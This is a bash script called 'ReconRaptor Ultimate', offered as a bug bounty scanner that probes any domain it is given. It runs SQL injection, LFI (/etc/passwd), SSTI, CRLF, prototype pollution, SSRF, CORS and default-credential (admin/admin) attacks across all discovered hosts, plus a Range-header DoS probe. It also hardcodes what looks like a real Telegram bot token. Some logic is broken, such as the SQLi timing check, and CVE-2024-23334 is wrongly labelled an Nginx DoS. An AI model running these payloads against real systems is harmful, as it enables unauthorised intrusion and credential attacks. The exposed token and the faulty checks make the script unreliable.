#!/bin/bash
# ReconRaptor Ultimate - All-in-One Bug Bounty Scanner
# Usage: ./reconraptor.sh example.com

# ===== Configuration =====
DOMAIN=$1
LHOST="your-server.com"           # For open redirect testing
TELEGRAM=false                    # Set to true to enable
BOT_TOKEN="7767401198:AAENXdRc440k7F0jOW8q-plDstCuFORg8Zc"        # Only if TELEGRAM=true
CHAT_ID="1253970404"                # Only if TELEGRAM=true
THREADS=50                        # Adjust based on your hardware
WORKDIR="/home/reconraptor/results/$DOMAIN-$(date +%Y%m%d)"
LOG_FILE="$WORKDIR/raptor.log"

# ===== Initialization =====
mkdir -p "$WORKDIR" && cd "$WORKDIR" || exit 1
exec 2>"$LOG_FILE"                # Redirect all errors to log

# Telegram notification function
notify() {
  if [ "$TELEGRAM" = true ]; then
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
      -d chat_id="$CHAT_ID" \
      -d text="$1" >/dev/null
  fi
  echo "$1"
}

# ===== Tool Checks =====
notify "🔍 Starting ReconRaptor Ultimate scan for $DOMAIN"

check_tool() {
  if ! command -v "$1" >/dev/null; then
    notify "❌ Error: $1 not installed!"
    exit 1
  fi
}

check_tool subfinder
check_tool httpx
check_tool dalfox
check_tool gau
check_tool gf
check_tool rush
check_tool hakrawler
check_tool qsreplace
check_tool nuclei

# ===== Core 12 Scans =====
run_core_scans() {
  notify "🚀 Running 12 core vulnerability checks..."

  # 1. XSS Scan (Dalfox)
  notify "[1/12] XSS Scanning..."
  cat urls.txt | dalfox pipe --multicast --skip-bav -o xss_results.txt 2>/dev/null

  # 2. Hidden Parameters
  notify "[2/12] Finding hidden parameters..."
  cat alive.txt | rush -j $THREADS 'curl -skl "{}"' | \
    grep -E 'type="hidden"|name="[^"]+"' | \
    grep -Eo 'name="[^"]+"' | cut -d'"' -f2 | anew params.txt

  # 3. Secrets in JS
  notify "[3/12] Hunting secrets in JS files..."
  cat alive.txt | rush -j $THREADS 'hakrawler -plain -js -depth 2 -url {}' | anew js_files.txt
  cat js_files.txt | rush -j 10 'python3 /home/reconraptor/tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secrets.txt

  # 4. Open Redirects
  notify "[4/12] Checking open redirects..."
  gau "$DOMAIN" | gf redirect | qsreplace "$LHOST" | \
    rush -j $THREADS 'curl -skI -m 5 "{}" | grep -qi "location: $LHOST" && echo "VULN: {}"' | anew redirects.txt

  # 5. Prototype Pollution
  notify "[5/12] Testing prototype pollution..."
  cat alive.txt | sed 's|$|/?__proto__[testparam]=exploit/|' | \
    rush -j $THREADS 'page-fetch -j "window.testparam===\\"exploit\\"?\\"[VULN] {}\\":\\"[SAFE] {}\\""' | \
    grep "VULN" | anew proto_pollution.txt

  # 6. SSRF Indicators (No Burp)
  notify "[6/12] Finding SSRF indicators..."
  gau "$DOMAIN" | grep "=" | qsreplace "http://$LHOST/test" | anew ssrf_test.txt
  cat ssrf_test.txt | rush -j $THREADS 'curl -skI -m 5 "{}" | grep -qi "location: $LHOST" && echo "SSRF_CANDIDATE: {}"' | anew ssrf_results.txt

  # 7. SQLi Time-Based
  notify "[7/12] Testing for SQLi (Time-Based)..."
  gau "$DOMAIN" | sed 's/=[^&]*/=sleep(5)/g' | \
    rush -j $THREADS 'timeout 10 curl -sk "{}" -o /dev/null -w "%{http_code} %{url_effective}\\n" 2>&1 | \
    awk -v u="{}" '\''/real/ {if($2 >=5) print "SQLi_TIME: " u}'\'' | \
    grep -v "000 "' | anew sqli.txt

  # 8. SSTI Testing
  notify "[8/12] Checking SSTI..."
  waybackurls "$DOMAIN" | qsreplace "daman{{9*9}}" | anew ssti_fuzz.txt
  ffuf -u FUZZ -w ssti_fuzz.txt -t $THREADS -v -o ssti_results.txt 2>/dev/null

  # 9. CRLF Injection
  notify "[9/12] Testing CRLF..."
  cat alive.txt | rush -j $THREADS 'curl -Iks -m 5 "{}/%0D%0Acrlf:crlf" | grep -q "^crlf:crlf" && echo "CRLF: {}"' | anew crlf.txt
  cat urls.txt | qsreplace "%0d%0acrlf:crlf" | rush -j $THREADS 'curl -skI -m 5 "{}" | grep -q "^crlf:crlf" && echo "CRLF: {}"' | anew crlf.txt

  # 10. SpringBoot Actuator
  notify "[10/12] Checking SpringBoot..."
  cat alive.txt | rush -j $THREADS 'curl -skI -m 5 "{}/env" | grep -qi "x-application-context" && echo "SpringBoot: {}"' | anew springboot.txt
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 "{}/actuator/env" | grep -q "spring.config.location" && echo "SpringBoot Actuator: {}"' | anew springboot.txt

  # 11. LFI Scan
  notify "[11/12] Testing LFI..."
  gau "$DOMAIN" | gf lfi | qsreplace "/etc/passwd" | \
    rush -j $THREADS 'curl -sk "{}" | grep -q "root:x:" && echo "LFI: {}"' | anew lfi.txt

  # 12. HTML Injection
  notify "[12/12] Checking HTML Injection..."
  cat urls.txt | grep -E "contact|feedback|comment" | qsreplace '"><h1>test</h1>' | \
    rush -j $THREADS 'curl -sk "{}" | grep -q "<h1>test</h1>" && echo "HTML_INJECTION: {}"' | anew html_injection.txt
}

# ===== Advanced Discovery Modules =====
run_advanced_scans() {
  notify "🔮 Running 15 advanced discovery modules..."

  # 1. CORS Misconfigurations
  notify "[1/15] CORS Testing..."
  cat alive.txt | rush -j $THREADS 'curl -skI -m 5 -H "Origin: https://evil.com" "{}" | \
    grep -i "access-control-allow-origin: https://evil.com" && echo "CORS_VULN: {}"' | anew cors.txt

  # 2. GraphQL Introspection
  notify "[2/15] GraphQL Checks..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 -X POST "{}" \
    -H "Content-Type: application/json" \
    --data '\''{"query":"{__schema{types{name}}}"}'\'' | \
    grep -q "__schema" && echo "GRAPHQL_INTROSPECTION: {}"' | anew graphql.txt

  # 3. S3 Buckets
  notify "[3/15] S3 Bucket Hunting..."
  cat subs.txt | grep -E 's3|bucket|storage' | \
    rush -j $THREADS 'aws s3 ls s3://{} --no-sign-request 2>&1 | \
    grep -qv "AccessDenied" && echo "OPEN_S3: {}"' | anew s3_buckets.txt

  # 4. .git Exposures
  notify "[4/15] Checking .git Exposures..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 "{}/.git/HEAD" | \
    grep -q "ref:" && echo "GIT_EXPOSED: {}"' | anew git_exposure.txt

  # 5. Backup Files
  notify "[5/15] Finding Backup Files..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 "{}/backup.zip" -o /dev/null -w "%{http_code}" | \
    grep -q "200" && echo "BACKUP_FILE: {}/backup.zip"' | anew backups.txt

  # 6. Admin Panels
  notify "[6/15] Admin Panel Discovery..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 "{}/admin" | \
    grep -qi "login" && echo "ADMIN_PANEL: {}/admin"' | anew admin_panels.txt

  # 7. API Documentation
  notify "[7/15] API Doc Hunting..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 "{}/api-docs" | \
    grep -qi "swagger" && echo "SWAGGER_DOCS: {}/api-docs"' | anew api_docs.txt

  # 8. Default Credentials
  notify "[8/15] Testing Default Creds..."
  cat admin_panels.txt | rush -j $THREADS 'curl -sk -m 5 -X POST "{}" \
    -d "username=admin&password=admin" | \
    grep -qv "invalid" && echo "DEFAULT_CREDS_POSSIBLE: {}"' | anew default_creds.txt

  # 9. Subdomain Takeover
  notify "[9/15] Subdomain Takeover Checks..."
  cat subs.txt | rush -j $THREADS 'curl -skI -m 5 "https://{}" | \
    grep -E "404 Not Found|521" && echo "TAKEOVER_CANDIDATE: {}"' | anew takeover.txt

  # 10. WordPress Scans
  notify "[10/15] WordPress Checks..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 "{}/wp-login.php" | \
    grep -qi "wordpress" && echo "WORDPRESS_SITE: {}"' | anew wordpress.txt
  [ -s wordpress.txt ] && wpscan --url-file wordpress.txt --no-update -o wpscan.txt

  # 11. Jira/Confluence
  notify "[11/15] Jira/Confluence Checks..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 "{}/login.jsp" | \
    grep -qi "atlassian" && echo "ATLASSIAN_SITE: {}"' | anew atlassian.txt

  # 12. Jenkins
  notify "[12/15] Jenkins Discovery..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 "{}/jenkins" | \
    grep -qi "jenkins" && echo "JENKINS_SITE: {}"' | anew jenkins.txt

  # 13. Database Exposures
  notify "[13/15] Database Checks..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 "{}:3306" | \
    grep -qi "mysql" && echo "MYSQL_EXPOSED: {}:3306"' | anew databases.txt

  # 14. CVE-2024-23334 (Nginx DoS)
  notify "[14/15] Nginx Range DoS Check..."
  cat alive.txt | rush -j $THREADS 'curl -sk -m 5 -H "Range: bytes=0-18446744073709551615" "{}" | \
    grep -qi "Requested Range Not Satisfiable" && echo "NGINX_RANGE_DOS: {}"' | anew nginx_dos.txt

  # 15. Nuclei Full Scan
  notify "[15/15] Running Nuclei..."
  cat alive.txt | nuclei -t /root/nuclei-templates/ -severity medium,high,critical -o nuclei_results.txt
}

# ===== Main Execution =====
{
  # Phase 1: Target Discovery
  notify "🌐 Phase 1: Target Discovery"
  subfinder -d "$DOMAIN" -all -silent -o subs.txt
  findomain -t "$DOMAIN" -q -o subs_temp.txt && cat subs_temp.txt | anew subs.txt
  cat subs.txt | httpx -silent -threads $THREADS -timeout 5 -o alive.txt
  gau "$DOMAIN" | anew urls.txt
  waybackurls "$DOMAIN" | anew urls.txt

  # Phase 2: Vulnerability Scanning
  notify "🔧 Phase 2: Vulnerability Scanning"
  run_core_scans
  run_advanced_scans

  # Phase 3: Results Processing
  notify "📊 Phase 3: Results Processing"
  grep -r -E "VULN|CANDIDATE|EXPOSED|POSSIBLE" "$WORKDIR" | \
    grep -vE "\.log|\.txt" | anew final_results.txt

  # Generate report
  echo "=== ReconRaptor Ultimate Report ===" > report.txt
  echo "Domain: $DOMAIN" >> report.txt
  echo "Scan Date: $(date)" >> report.txt
  echo "=== Critical Findings ===" >> report.txt
  grep -i "critical" final_results.txt >> report.txt
  echo "=== High Confidence ===" >> report.txt
  grep -i "vuln" final_results.txt >> report.txt
  echo "=== Potential Issues ===" >> report.txt
  grep -i "candidate" final_results.txt >> report.txt

  # Compress results
  tar -czf "$DOMAIN-results.tar.gz" ./*

  notify "✅ Scan completed! Results saved to $WORKDIR"
  [ "$TELEGRAM" = true ] && {
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
      -F chat_id="$CHAT_ID" \
      -F document=@"$DOMAIN-results.tar.gz" \
      -F caption="ReconRaptor Scan Complete: $DOMAIN"
  }

} | tee -a "$LOG_FILE"

# ===== Cleanup =====
[ -s "$LOG_FILE" ] && gzip "$LOG_FILE"
exit 0